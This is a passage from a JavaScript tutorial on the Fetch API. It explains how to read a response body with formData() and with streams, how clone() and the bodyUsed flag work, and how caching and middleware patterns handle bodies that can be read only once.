// Server sets: Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
const response = await fetch('/api/data');
const formData = await response.formData();
```

#### application/x-www-form-urlencoded

```javascript
// Server sets: Content-Type: application/x-www-form-urlencoded
const response = await fetch('/api/urlencoded-data');
const formData = await response.formData();

// URL-encoded data is parsed into FormData entries
const name = formData.get('name');
const email = formData.get('email');
```

### Error Handling

#### Content-Type Mismatch

```javascript
try {
  const response = await fetch('/api/json-endpoint');
  const formData = await response.formData();
} catch (error) {
  // TypeError: Failed to fetch or invalid content type
  console.error('Cannot parse as FormData:', error);
}
```

#### Malformed Data

```javascript
try {
  const response = await fetch('/api/corrupt-form-data');
  const formData = await response.formData();
} catch (error) {
  console.error('Parsing failed:', error.message);
}
```

#### Network Errors

```javascript
try {
  const response = await fetch('/api/form-data');
  
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
  }
  
  const formData = await response.formData();
} catch (error) {
  console.error('Request failed:', error);
}
```

### Working with FormData Object

#### Reading Values

```javascript
const formData = await response.formData();

// Single value
const value = formData.get('fieldName');

// All values for a field (multiple entries with same name)
const allValues = formData.getAll('tags[]');

// Check existence
if (formData.has('optional_field')) {
  const optionalValue = formData.get('optional_field');
}
```

#### Iterating Entries

```javascript
const formData = await response.formData();

// entries() - key-value pairs
for (const [key, value] of formData.entries()) {
  console.log(key, value);
}

// keys() - field names only
for (const key of formData.keys()) {
  console.log(key);
}

// values() - values only
for (const value of formData.values()) {
  console.log(value);
}
```

#### Handling Files

```javascript
const formData = await response.formData();
const file = formData.get('upload');

if (file instanceof File) {
  console.log('File name:', file.name);
  console.log('File size:', file.size);
  console.log('MIME type:', file.type);
  console.log('Last modified:', new Date(file.lastModified));
  
  // Read file content
  const text = await file.text();
  const arrayBuffer = await file.arrayBuffer();
  const blob = file; // File extends Blob
}
```

### Body Consumption

#### Single Read Only

Once `formData()` is called, the response body is consumed:

```javascript
const response = await fetch('/api/data');
const formData = await response.formData();

// These will throw TypeError
try {
  await response.formData(); // Error: body already read
  await response.json();      // Error: body already read
  await response.text();      // Error: body already read
} catch (error) {
  console.error(error.message);
}
```

#### Checking Body State

```javascript
const response = await fetch('/api/data');

console.log(response.bodyUsed); // false

const formData = await response.formData();

console.log(response.bodyUsed); // true
```

#### Cloning for Multiple Reads

```javascript
const response = await fetch('/api/data');
const clonedResponse = response.clone();

const formData1 = await response.formData();
const formData2 = await clonedResponse.formData();
```

### Practical Patterns

#### Conditional Parsing Based on Content-Type

```javascript
const response = await fetch('/api/dynamic-endpoint');
const contentType = response.headers.get('content-type');

let data;
if (contentType?.includes('multipart/form-data') || 
    contentType?.includes('application/x-www-form-urlencoded')) {
  data = await response.formData();
} else if (contentType?.includes('application/json')) {
  data = await response.json();
} else {
  data = await response.text();
}
```

#### Extracting Files for Download

```javascript
const response = await fetch('/api/download-package');
const formData = await response.formData();

for (const [key, value] of formData.entries()) {
  if (value instanceof File) {
    // Create download link
    const url = URL.createObjectURL(value);
    const a = document.createElement('a');
    a.href = url;
    a.download = value.name;
    a.click();
    URL.revokeObjectURL(url);
  }
}
```

#### Converting to Plain Object

```javascript
const response = await fetch('/api/form-data');
const formData = await response.formData();

// Simple conversion (loses duplicate keys)
const obj = Object.fromEntries(formData.entries());

// Preserving all values
const objWithArrays = {};
for (const [key, value] of formData.entries()) {
  if (objWithArrays[key]) {
    if (Array.isArray(objWithArrays[key])) {
      objWithArrays[key].push(value);
    } else {
      objWithArrays[key] = [objWithArrays[key], value];
    }
  } else {
    objWithArrays[key] = value;
  }
}
```

#### Validating Before Processing

```javascript
async function processFormResponse(url) {
  const response = await fetch(url);
  
  // Verify content type
  const contentType = response.headers.get('content-type');
  if (!contentType?.includes('multipart/form-data') && 
      !contentType?.includes('application/x-www-form-urlencoded')) {
    throw new Error(`Expected form data, got ${contentType}`);
  }
  
  // Verify status
  if (!response.ok) {
    throw new Error(`HTTP error ${response.status}`);
  }
  
  const formData = await response.formData();
  
  // Validate required fields
  const requiredFields = ['id', 'name', 'file'];
  for (const field of requiredFields) {
    if (!formData.has(field)) {
      throw new Error(`Missing required field: ${field}`);
    }
  }
  
  return formData;
}
```

### Performance Considerations

#### Memory Usage with Large Files

```javascript
const response = await fetch('/api/large-file-package');
const formData = await response.formData();

// Entire response is loaded into memory
const largeFile = formData.get('video'); // File object in memory

// For very large files, consider streaming alternatives
// or processing on the server side
```

#### Streaming Alternative for Large Data

[Inference] For extremely large form data responses, the entire body must be loaded into memory before parsing. There is no built-in streaming parser for FormData in the Fetch API. If memory is a concern, consider:

- Having the server send files individually via separate endpoints
- Using chunked transfer with custom parsing
- Processing on the server and sending only results

### Browser Compatibility

The `formData()` method is widely supported in modern browsers. [Inference] It's part of the Fetch API standard and available in:

- Chrome/Edge (modern versions)
- Firefox (modern versions)
- Safari (modern versions)
- Node.js (via native fetch in v18+ or polyfills)

### Comparison with Other Body Methods

```javascript
const response = await fetch('/api/data');

// formData() - for multipart/form-data or urlencoded
const formData = await response.formData();

// json() - for application/json
const jsonData = await response.json();

// text() - for text/* or any content as string
const textData = await response.text();

// blob() - for binary data
const blobData = await response.blob();

// arrayBuffer() - for raw binary
const bufferData = await response.arrayBuffer();
```

Each method is optimized for its data type and cannot be used interchangeably after the first call.

---

## Body Stream Handling

The Fetch API treats response bodies as readable streams, providing fine-grained control over data consumption, memory management, and processing of large payloads.

### Stream Fundamentals

#### Body as ReadableStream

Response bodies are `ReadableStream` objects that can only be read once. Once consumed, the stream is locked and cannot be read again.

```javascript
const response = await fetch(url);
const stream = response.body; // ReadableStream

// Stream can only be consumed once
const data1 = await response.json(); // Consumes stream
const data2 = await response.text(); // Error: body already used
```

#### Body Usage Detection

```javascript
const response = await fetch(url);

console.log(response.bodyUsed); // false

await response.json();

console.log(response.bodyUsed); // true

// Attempting to read again throws
await response.text(); // TypeError: body stream already read
```

### Stream Reading Methods

#### High-Level Methods (Consume Entire Stream)

These methods read the complete stream and return a Promise:

```javascript
// JSON parsing
const jsonData = await response.json();

// Plain text
const textData = await response.text();

// ArrayBuffer (binary data)
const buffer = await response.arrayBuffer();

// Blob (file-like data)
const blob = await response.blob();

// FormData
const formData = await response.formData();
```

#### Low-Level Stream Reading

Direct access to the ReadableStream for custom processing:

```javascript
const response = await fetch(url);
const reader = response.body.getReader();

while (true) {
  const { done, value } = await reader.read();
  
  if (done) break;
  
  // value is a Uint8Array chunk
  console.log('Received chunk:', value);
}
```

### Progressive Data Processing

#### Streaming Large Responses

```javascript
async function streamResponse(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let result = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    // Decode chunk and process incrementally
    const chunk = decoder.decode(value, { stream: true });
    result += chunk;
    
    // Process partial data as it arrives
    console.log('Chunk received:', chunk.length, 'bytes');
  }
  
  return result;
}
```

#### Progress Tracking

```javascript
async function fetchWithProgress(url, onProgress) {
  const response = await fetch(url);
  const contentLength = response.headers.get('Content-Length');
  const total = parseInt(contentLength, 10);
  
  let loaded = 0;
  const reader = response.body.getReader();
  const chunks = [];
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    chunks.push(value);
    loaded += value.length;
    
    onProgress({ loaded, total, percentage: (loaded / total) * 100 });
  }
  
  // Reconstruct full response
  const chunksAll = new Uint8Array(loaded);
  let position = 0;
  for (const chunk of chunks) {
    chunksAll.set(chunk, position);
    position += chunk.length;
  }
  
  return chunksAll;
}

// Usage
fetchWithProgress('/large-file.zip', (progress) => {
  console.log(`Downloaded: ${progress.percentage.toFixed(2)}%`);
});
```

### Stream Cloning

#### Using clone() Method

The `Response.clone()` method creates a duplicate that can be consumed independently:

```javascript
const response = await fetch(url);

// Clone before consuming
const clone = response.clone();

// Both can be consumed independently
const json = await response.json();
const text = await clone.text();
```

#### Clone Use Cases

```javascript
// Caching while processing
async function fetchAndCache(url) {
  const response = await fetch(url);
  
  if (response.ok) {
    // Clone for cache
    const cacheResponse = response.clone();
    
    // Store in cache
    caches.open('my-cache').then(cache => {
      cache.put(url, cacheResponse);
    });
    
    // Process original
    return response.json();
  }
}
```

**Important**: Cloning must occur before the original stream is consumed. Cloning after consumption throws an error.

```javascript
const response = await fetch(url);
await response.json(); // Consumes stream

const clone = response.clone(); // TypeError: body already used
```

### Stream Transformation

#### Using TransformStream

```javascript
async function transformStream(url) {
  const response = await fetch(url);
  
  const transformStream = new TransformStream({
    transform(chunk, controller) {
      // Modify chunks as they arrive
      const modified = chunk.map(byte => byte ^ 0xFF); // Example: invert bits
      controller.enqueue(modified);
    }
  });
  
  const transformedStream = response.body.pipeThrough(transformStream);
  const reader = transformedStream.getReader();
  
  // Read transformed data
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    // Process transformed chunks
  }
}
```

#### Custom Processing Pipeline

```javascript
async function processStreamPipeline(url) {
  const response = await fetch(url);
  
  // Decompress
  const decompressStream = new DecompressionStream('gzip');
  
  // Transform
  const transformStream = new TransformStream({
    transform(chunk, controller) {
      // Custom processing
      controller.enqueue(chunk);
    }
  });
  
  // Pipeline
  const processedStream = response.body
    .pipeThrough(decompressStream)
    .pipeThrough(transformStream);
  
  return new Response(processedStream);
}
```

### Memory Management

#### Streaming vs Buffering

**Buffering (high memory)**:

```javascript
// Loads entire response into memory
const response = await fetch(hugeFileUrl);
const blob = await response.blob(); // Memory spike
```

**Streaming (low memory)**:

```javascript
// Processes chunks incrementally
const response = await fetch(hugeFileUrl);
const reader = response.body.getReader();

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  
  // Process and discard each chunk
  await processChunk(value);
  // Chunk can be garbage collected
}
```

#### Backpressure Handling

```javascript
async function streamWithBackpressure(url, processor) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    
    // Wait for processor to finish before reading next chunk
    await processor(value);
    
    // Natural backpressure: won't read next chunk
    // until current chunk is processed
  }
}
```

### Cancellation and Cleanup

#### AbortController with Streams

```javascript
const controller = new AbortController();
const signal = controller.signal;

const response = await fetch(url, { signal });
const reader = response.body.getReader();

// Cancel after 5 seconds
setTimeout(() => controller.abort(), 5000);

try {
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    // Process chunks
  }
} catch (error) {
  if (error.name === 'AbortError') {
    console.log('Stream cancelled');
  }
} finally {
  reader.releaseLock(); // Clean up
}
```

#### Manual Stream Cancellation

```javascript
const response = await fetch(url);
const reader = response.body.getReader();

try {
  const { done, value } = await reader.read();
  
  if (someCondition) {
    reader.cancel('No longer needed');
    return;
  }
  
  // Continue reading...
} finally {
  reader.releaseLock();
}
```

### Streaming Uploads

#### Sending Stream as Request Body

```javascript
// Create readable stream for upload
const stream = new ReadableStream({
  start(controller) {
    // Generate data chunks
    for (let i = 0; i < 100; i++) {
      controller.enqueue(new Uint8Array([i]));
    }
    controller.close();
  }
});

// Upload stream
await fetch('/upload', {
  method: 'POST',
  body: stream,
  headers: {
    'Content-Type': 'application/octet-stream'
  }
});
```

#### Streaming File Upload with Progress

```javascript
async function uploadFileStream(file, onProgress) {
  const stream = file.stream();
  let uploaded = 0;
  
  const monitoredStream = new ReadableStream({
    async start(controller) {
      const reader = stream.getReader();
      
      while (true) {
        const { done, value } = await reader.read();
        
        if (done) {
          controller.close();
          break;
        }
        
        uploaded += value.length;
        onProgress({ uploaded, total: file.size });
        
        controller.enqueue(value);
      }
    }
  });
  
  await fetch('/upload', {
    method: 'POST',
    body: monitoredStream,
    duplex: 'half' // Required for streaming uploads
  });
}
```

### Text Streaming Patterns

#### Line-by-Line Processing

```javascript
async function streamLines(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let buffer = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) {
      // Process remaining buffer
      if (buffer) console.log('Last line:', buffer);
      break;
    }
    
    buffer += decoder.decode(value, { stream: true });
    
    // Split on newlines
    const lines = buffer.split('\n');
    
    // Keep last incomplete line in buffer
    buffer = lines.pop() || '';
    
    // Process complete lines
    for (const line of lines) {
      console.log('Line:', line);
    }
  }
}
```

#### JSON Streaming (NDJSON)

```javascript
async function streamNDJSON(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let buffer = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    buffer += decoder.decode(value, { stream: true });
    const lines = buffer.split('\n');
    buffer = lines.pop() || '';
    
    for (const line of lines) {
      if (line.trim()) {
        try {
          const json = JSON.parse(line);
          console.log('JSON object:', json);
        } catch (e) {
          console.error('Parse error:', e);
        }
      }
    }
  }
}
```

### Server-Sent Events Simulation

```javascript
async function streamSSE(url, onMessage) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let buffer = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    buffer += decoder.decode(value, { stream: true });
    const events = buffer.split('\n\n');
    buffer = events.pop() || '';
    
    for (const event of events) {
      const lines = event.split('\n');
      const data = lines
        .filter(line => line.startsWith('data:'))
        .map(line => line.slice(5).trim())
        .join('\n');
      
      if (data) {
        onMessage(data);
      }
    }
  }
}
```

### Error Handling in Streams

#### Stream Read Errors

```javascript
async function streamWithErrorHandling(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  
  try {
    while (true) {
      const { done, value } = await reader.read();
      
      if (done) break;
      
      // Process chunk
      await processChunk(value);
    }
  } catch (error) {
    console.error('Stream error:', error);
    
    // Clean up
    await reader.cancel();
  } finally {
    reader.releaseLock();
  }
}
```

#### Timeout During Streaming

```javascript
async function streamWithTimeout(url, timeoutMs) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  
  const timeout = (ms) => new Promise((_, reject) =>
    setTimeout(() => reject(new Error('Stream timeout')), ms)
  );
  
  try {
    while (true) {
      const { done, value } = await Promise.race([
        reader.read(),
        timeout(timeoutMs)
      ]);
      
      if (done) break;
      
      // Process chunk
    }
  } catch (error) {
    await reader.cancel();
    throw error;
  } finally {
    reader.releaseLock();
  }
}
```

### Browser Compatibility Notes

[Unverified: Specific browser version requirements without current checking]

ReadableStream support is available in modern browsers. Stream operations like `pipeThrough()` and `TransformStream` have more limited support in older browsers. The `duplex: 'half'` option for streaming uploads is a newer addition with varying browser support.

### Performance Considerations

**Stream reading is more efficient for**:

- Large responses (>1MB)
- Real-time data processing
- Memory-constrained environments
- Progress tracking requirements

**Direct methods (json(), text()) are simpler for**:

- Small responses (<100KB)
- Simple parsing needs
- When entire payload is needed before processing

[Inference: Performance characteristics based on typical stream behavior patterns, not empirical benchmarks]

---

## Multiple Body Reads

### The One-Time Read Constraint

Response and request bodies in the Fetch API cannot be read more than once. This fundamental constraint exists because request and response bodies are treated as streams, and streams are consumed when read.

**Why This Limitation Exists:**

The streaming design provides memory efficiency. When operations like cache.put(request, response) are called, the response stream is piped to the cache, allowing large responses to be handled without buffering them into memory. This prevents the need to store potentially massive response payloads entirely in RAM before processing them.

Once a body has been read with one method like response.text(), calling another method like response.json() will fail because the body content has already been processed.

#### Example of Failed Multiple Reads

```javascript
let response = await fetch(url);
let text = await response.text(); // response body consumed
let parsed = await response.json(); // fails (already consumed)
```

**[Inference] This will throw an error** because after the first read operation (`response.text()`), the stream has been consumed and is no longer available.

### Detecting Body Usage Status

#### Response.bodyUsed Property

The bodyUsed property is a read-only boolean value that indicates whether the body has been read yet. Reading the body of a response changes the value of bodyUsed from false to true.

**Usage Example:**

```javascript
const responsePromise = fetch("/api/data");

const response = await responsePromise;
if (response.bodyUsed) {
  console.log("Body has already been used!");
} else {
  const result = await response.blob();
  // process result
}
```

**[Inference] The bodyUsed property provides a way to guard against attempting to read an already-consumed body**, which would otherwise result in an error.

### Solution: Response.clone()

#### The clone() Method

The clone() method of the Response interface creates a clone of a response object, identical in every way, but stored in a different variable. clone() throws a TypeError if the response body has already been used.

**[Inference] Cloning must occur before any read operations** to be effective. Once a body is consumed, it cannot be cloned.

#### Basic Clone Pattern

```javascript
fetch('/api/data').then((response) => {
  const response2 = response.clone();
  
  response.blob().then((myBlob) => {
    const objectURL = URL.createObjectURL(myBlob);
    image1.src = objectURL;
  });
  
  response2.blob().then((myBlob) => {
    const objectURL = URL.createObjectURL(myBlob);
    image2.src = objectURL;
  });
});
```

#### Common Use Cases

**1. Try JSON, Fallback to Text:**

```javascript
fetch('/data').then(function(response) {
  return response.clone().json().catch(function() {
    // parsing as JSON failed, let's get the text
    return response.text().then(function(text) {
      // process text
    });
  });
});
```

By calling clone before the first read, the original response can still be read after the cloned version is consumed.

**2. Cache and Return Pattern (Service Workers):**

```javascript
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.open('content').then((cache) => {
      return fetch(event.request).then((response) => {
        // Store clone in cache
        cache.put(event.request, response.clone());
        // Return original to browser
        return response;
      });
    })
  );
});
```

When sending a clone into the cache and the original back to the browser, both streams are being consumed simultaneously, maintaining memory efficiency without needing to hold the original in memory.

### Backpressure and Memory Considerations

#### Understanding Backpressure

Like the underlying ReadableStream.tee API, the body of a cloned Response will signal backpressure at the rate of the faster consumer of the two bodies, and unread data is enqueued internally on the slower consumed body without any limit or backpressure.

Backpressure refers to the mechanism by which the streaming consumer of data slows down the producer of data so as not to load large amounts of data in memory that is waiting to be used by the application.

#### Memory Implications

If only one cloned branch is consumed, then the entire body will be buffered in memory. Therefore, clone() is one way to read a response twice in sequence, but you should not use it to read very large bodies in parallel at different speeds.

**[Inference] Sequential consumption of clones is safer for large responses** than parallel consumption at significantly different speeds, as the latter can lead to excessive memory buffering.

### Request Body Cloning

The same constraints and solutions apply to Request objects.

#### Failed Request Reuse:

```javascript
const request = new Request("https://example.org/post", {
  method: "POST",
  body: JSON.stringify({ username: "example" })
});

const response1 = await fetch(request);
console.log(response1.status);

// Will throw: "Body has already been consumed."
const response2 = await fetch(request);
```

#### Correct Approach with Cloning:

```javascript
const request1 = new Request("https://example.org/post", {
  method: "POST",
  body: JSON.stringify({ username: "example" })
});

const request2 = request1.clone();

const response1 = await fetch(request1);
console.log(response1.status);

const response2 = await fetch(request2);
console.log(response2.status);
```

Instead of reusing a consumed request, create a clone of the request before sending it.

### Best Practices

**1. Clone Before Reading:** Always call `clone()` before any body-reading operations if you need multiple reads.

**2. Check bodyUsed:** Use the `bodyUsed` property to verify whether a body has been consumed before attempting to read it.

**3. Consider Memory Impact:** For large responses, prefer sequential reads or single reads when possible.

**4. Service Worker Pattern:** When caching responses, clone before storing so the original can be returned to the client.

**5. Error Handling Patterns:** Clone responses when implementing fallback logic that requires trying multiple parsing methods.

### Limitations and Caveats

**Clone Timing:** clone() throws a TypeError if the response body has already been used. **[Inference] There is no way to "unconsume" a body once it has been read.**

**Large Response Warning:** **[Unverified] Cloning very large responses and consuming them at different rates may cause memory issues** due to buffering of unread data in the slower consumer.

**Single Reader Lock:** A stream can't be read by more than one reader at once. **[Inference] Without cloning via the tee() method or response.clone(), attempting simultaneous reads will fail.**

---

## Body Used Flag

The body used flag is an internal state indicator that tracks whether a response or request body has been consumed. Once a body is read using any of the body consumption methods (`json()`, `text()`, `blob()`, `arrayBuffer()`, `formData()`), the body is marked as "used" and cannot be read again.

### The bodyUsed Property

The `bodyUsed` property is a read-only boolean that indicates whether the body has been consumed.

```javascript
const response = await fetch('https://api.example.com/data');

console.log(response.bodyUsed); // false

const data = await response.json();

console.log(response.bodyUsed); // true
```

### Why Bodies Can Only Be Read Once

HTTP response bodies are streams of data. Once the stream is consumed, it cannot be "rewound" to read again. This is by design for performance and memory efficiency—the browser doesn't keep the entire response in memory after it's been processed.

```javascript
const response = await fetch('https://api.example.com/data');

const data = await response.json(); // First read - works
console.log(response.bodyUsed); // true

const dataAgain = await response.json(); // Second read - fails
// TypeError: Failed to execute 'json' on 'Response': body stream already read
```

### All Body Consumption Methods Set the Flag

Every method that reads the body sets `bodyUsed` to `true`:

```javascript
const response1 = await fetch('https://api.example.com/data');
await response1.json();
console.log(response1.bodyUsed); // true

const response2 = await fetch('https://api.example.com/data');
await response2.text();
console.log(response2.bodyUsed); // true

const response3 = await fetch('https://api.example.com/data');
await response3.blob();
console.log(response3.bodyUsed); // true

const response4 = await fetch('https://api.example.com/data');
await response4.arrayBuffer();
console.log(response4.bodyUsed); // true

const response5 = await fetch('https://api.example.com/data');
await response5.formData();
console.log(response5.bodyUsed); // true
```

### Checking Before Consumption

Always check `bodyUsed` before attempting to read a body, especially when passing responses through multiple functions.

```javascript
async function processResponse(response) {
  if (response.bodyUsed) {
    throw new Error('Response body has already been consumed');
  }
  
  return await response.json();
}

const response = await fetch('https://api.example.com/data');
const data1 = await processResponse(response); // Works

const data2 = await processResponse(response); // Throws error
```

### Practical Pattern: Check Before Read

```javascript
async function safeReadJSON(response) {
  if (response.bodyUsed) {
    console.warn('Body already used, cannot read');
    return null;
  }
  
  try {
    return await response.json();
  } catch (error) {
    console.error('Failed to parse JSON:', error);
    return null;
  }
}

const response = await fetch('https://api.example.com/data');
const data = await safeReadJSON(response); // Works
const retry = await safeReadJSON(response); // Returns null with warning
```

### Cloning Responses to Read Multiple Times

Use `response.clone()` to create a copy of the response before consuming the body. Each clone has its own independent body stream.

```javascript
const response = await fetch('https://api.example.com/data');

console.log(response.bodyUsed); // false

const clone = response.clone();

console.log(response.bodyUsed); // false
console.log(clone.bodyUsed); // false

// Read from original
const data1 = await response.json();
console.log(response.bodyUsed); // true
console.log(clone.bodyUsed); // false - still independent

// Read from clone
const data2 = await clone.json();
console.log(clone.bodyUsed); // true
```

### Multiple Processing Paths

Cloning is useful when you need to process the response in different ways simultaneously.

```javascript
const response = await fetch('https://api.example.com/data');

// Create clones for different purposes
const logClone = response.clone();
const cacheClone = response.clone();

// Log raw text (without consuming main response)
logClone.text().then(text => {
  console.log('Raw response:', text);
});

// Cache the response
cacheClone.blob().then(blob => {
  // Store in IndexedDB or Cache API
});

// Process the main response
const data = await response.json();
// Use data normally
```

### Cloning Limitations

You cannot clone a response whose body has already been consumed.

```javascript
const response = await fetch('https://api.example.com/data');

const data = await response.json();
console.log(response.bodyUsed); // true

const clone = response.clone(); // TypeError: Failed to execute 'clone' on 'Response': Response body is already used
```

### Pattern: Clone Before Any Consumption

```javascript
async function processWithLogging(url) {
  const response = await fetch(url);
  
  // Clone BEFORE consuming
  const loggingClone = response.clone();
  
  // Log in background
  loggingClone.text().then(text => {
    console.log(`Response from ${url}:`, text);
  });
  
  // Process normally
  return await response.json();
}
```

### Body Streams and the Used Flag

The body used flag is directly tied to the underlying `ReadableStream` in `response.body`.

```javascript
const response = await fetch('https://api.example.com/data');

console.log(response.bodyUsed); // false
console.log(response.body.locked); // false

// Start reading the stream
const reader = response.body.getReader();

console.log(response.bodyUsed); // false (not fully consumed yet)
console.log(response.body.locked); // true (stream is locked to this reader)

// Read all chunks
let result = await reader.read();
while (!result.done) {
  result = await reader.read();
}

console.log(response.bodyUsed); // true (fully consumed)
```

### Empty Bodies

Responses with no body (like 204 No Content) or methods that don't return bodies (like HEAD requests) still have the `bodyUsed` property, but reading them may behave differently.

```javascript
// HEAD request - no body expected
const headResponse = await fetch('https://api.example.com/data', {
  method: 'HEAD'
});

console.log(headResponse.bodyUsed); // false
const data = await headResponse.json(); // May resolve to null or throw
console.log(headResponse.bodyUsed); // true
```

```javascript
// 204 No Content response
const response = await fetch('https://api.example.com/delete/123', {
  method: 'DELETE'
});

if (response.status === 204) {
  console.log(response.bodyUsed); // false
  // Don't attempt to read body - there isn't one
  // Attempting to read may resolve to empty string or throw
}
```

### Request Bodies and bodyUsed

The `bodyUsed` flag also exists on `Request` objects, following the same behavior.

```javascript
const request = new Request('https://api.example.com/data', {
  method: 'POST',
  body: JSON.stringify({ name: 'John' })
});

console.log(request.bodyUsed); // false

const bodyText = await request.text();
console.log(request.bodyUsed); // true

// Cannot reuse this request
fetch(request); // May fail or send empty body
```

### Cloning Requests

Similar to responses, you can clone requests to send them multiple times.

```javascript
const request = new Request('https://api.example.com/data', {
  method: 'POST',
  body: JSON.stringify({ name: 'John' })
});

const clone = request.clone();

// Send original request
const response1 = await fetch(request);
console.log(request.bodyUsed); // true

// Send cloned request
const response2 = await fetch(clone);
console.log(clone.bodyUsed); // true after fetch
```

### Common Pitfall: Passing Responses Between Functions

```javascript
// Problematic pattern
async function validateResponse(response) {
  const data = await response.json(); // Consumes body
  
  if (!data.isValid) {
    throw new Error('Invalid data');
  }
  
  return response; // Body is already consumed!
}

async function processResponse(response) {
  const data = await response.json(); // Error: body already used
  // Process data
}

// Usage
const response = await fetch('https://api.example.com/data');
const validated = await validateResponse(response);
await processResponse(validated); // Fails!
```

### Solution: Pass Data, Not Responses

```javascript
// Better pattern
async function validateResponse(response) {
  const data = await response.json();
  
  if (!data.isValid) {
    throw new Error('Invalid data');
  }
  
  return data; // Return the data, not the response
}

async function processData(data) {
  // Process data directly
}

// Usage
const response = await fetch('https://api.example.com/data');
const data = await validateResponse(response);
await processData(data); // Works!
```

### Alternative Solution: Clone Before Passing

```javascript
async function validateResponse(response) {
  const clone = response.clone();
  const data = await clone.json();
  
  if (!data.isValid) {
    throw new Error('Invalid data');
  }
  
  return response; // Original response body still intact
}

async function processResponse(response) {
  const data = await response.json(); // Works - body not consumed
  // Process data
}

// Usage
const response = await fetch('https://api.example.com/data');
const validated = await validateResponse(response);
await processResponse(validated); // Works!
```

### Middleware Pattern with Cloning

```javascript
async function applyMiddleware(response, middlewares) {
  let currentResponse = response;
  
  for (const middleware of middlewares) {
    // Clone before passing to each middleware
    const clone = currentResponse.clone();
    currentResponse = await middleware(clone);
  }
  
  return currentResponse;
}

// Middleware functions
async function loggingMiddleware(response) {
  const clone = response.clone();
  clone.text().then(text => console.log('Response:', text));
  return response;
}

async function cachingMiddleware(response) {
  const clone = response.clone();
  // Cache the clone
  caches.open('api-cache').then(cache => {
    cache.put(response.url, clone);
  });
  return response;
}

// Usage
const response = await fetch('https://api.example.com/data');
const processedResponse = await applyMiddleware(response, [
  loggingMiddleware,
  cachingMiddleware
]);
const data = await processedResponse.json();
```

### Debugging Body Consumption Issues

```javascript
// Wrapper to track body consumption
function trackBodyUsage(response, label) {
  console.log(`[${label}] Initial bodyUsed:`, response.bodyUsed);
  
  const originalJson = response.json.bind(response);
  const originalText = response.text.bind(response);
  const originalBlob = response.blob.bind(response);
  const originalArrayBuffer = response.arrayBuffer.bind(response);
  
  response.json = async function() {
    console.log(`[${label}] Calling json(), bodyUsed before:`, this.bodyUsed);
    const result = await originalJson();
    console.log(`[${label}] Called json(), bodyUsed after:`, this.bodyUsed);
    return result;
  };
  
  response.text = async function() {
    console.log(`[${label}] Calling text(), bodyUsed before:`, this.bodyUsed);
    const result = await originalText();
    console.log(`[${label}] Called text(), bodyUsed after:`, this.bodyUsed);
    return result;
  };
  
  // Similar for other methods...
  
  return response;
}

// Usage
const response = await fetch('https://api.example.com/data');
const tracked = trackBodyUsage(response, 'API Response');
const data = await tracked.json();
// Logs show exactly when body was consumed
```

### Performance Considerations

#### Cloning Cost

Cloning a response creates a duplicate of the body stream, which has memory and performance implications.

```javascript
const response = await fetch('https://api.example.com/large-file');

// Creates multiple copies in memory
const clone1 = response.clone();
const clone2 = response.clone();
const clone3 = response.clone();

// Each clone consumes memory until its body is read
// Be mindful with large responses
```

#### When Not to Clone

```javascript
// Unnecessary cloning
async function unnecessaryClone(response) {
  const clone = response.clone();
  return await clone.json(); // Original response is never used
}

// Better - just use the original
async function efficient(response) {
  return await response.json();
}
```

#### When Cloning is Necessary

```javascript
// Necessary cloning - original needs to be preserved
async function cacheAndReturn(response) {
  const clone = response.clone();
  
  // Cache the clone
  caches.open('api-cache').then(cache => {
    cache.put(response.url, clone);
  });
  
  // Return original for immediate use
  return response;
}
```

### Integration with Cache API

The Cache API respects the body used flag when storing and retrieving responses.

```javascript
// Storing in cache
const response = await fetch('https://api.example.com/data');
const cache = await caches.open('my-cache');

// Must clone before caching if you want to use the response
const cacheClone = response.clone();
await cache.put('https://api.example.com/data', cacheClone);

// Original response still usable
const data = await response.json();
```

```javascript
// Retrieving from cache
const cache = await caches.open('my-cache');
const cachedResponse = await cache.match('https://api.example.com/data');

if (cachedResponse) {
  console.log(cachedResponse.bodyUsed); // false
  const data = await cachedResponse.json();
  console.log(cachedResponse.bodyUsed); // true
  
  // Cannot read again from cache without new match
  const freshCopy = await cache.match('https://api.example.com/data');
  const dataAgain = await freshCopy.json(); // Works - new response object
}
```

### Testing Body Consumption

```javascript
// Test helper to verify body hasn't been consumed
function assertBodyNotUsed(response, message) {
  if (response.bodyUsed) {
    throw new Error(message || 'Expected body to not be used, but it was');
  }
}

// Usage in tests
const response = await fetch('https://api.example.com/data');
assertBodyNotUsed(response, 'Body should not be consumed before processing');

await someFunction(response);
assertBodyNotUsed(response, 'someFunction should not consume the body');
```

### Type Guards and Body Used

```javascript
async function safelyReadResponse(response) {
  // Type guard pattern
  if (!response || response.bodyUsed) {
    return null;
  }
  
  try {
    const contentType = response.headers.get('Content-Type');
    
    if (contentType?.includes('application/json')) {
      return await response.json();
    }
    
    if (contentType?.includes('text/')) {
      return await response.text();
    }
    
    return await response.blob();
  } catch (error) {
    console.error('Failed to read response:', error);
    return null;
  }
}
```

### Documenting Body Consumption in APIs

When creating functions that accept responses, clearly document whether they consume the body.

```javascript
/**
 * Validates response status and headers.
 * Does NOT consume the response body.
 * 
 * @param {Response} response - The fetch response
 * @returns {boolean} - Whether the response is valid
 */
function validateResponseHeaders(response) {
  return response.ok && 
         response.headers.get('Content-Type')?.includes('json');
}

/**
 * Extracts and validates JSON data from response.
 * CONSUMES the response body.
 * 
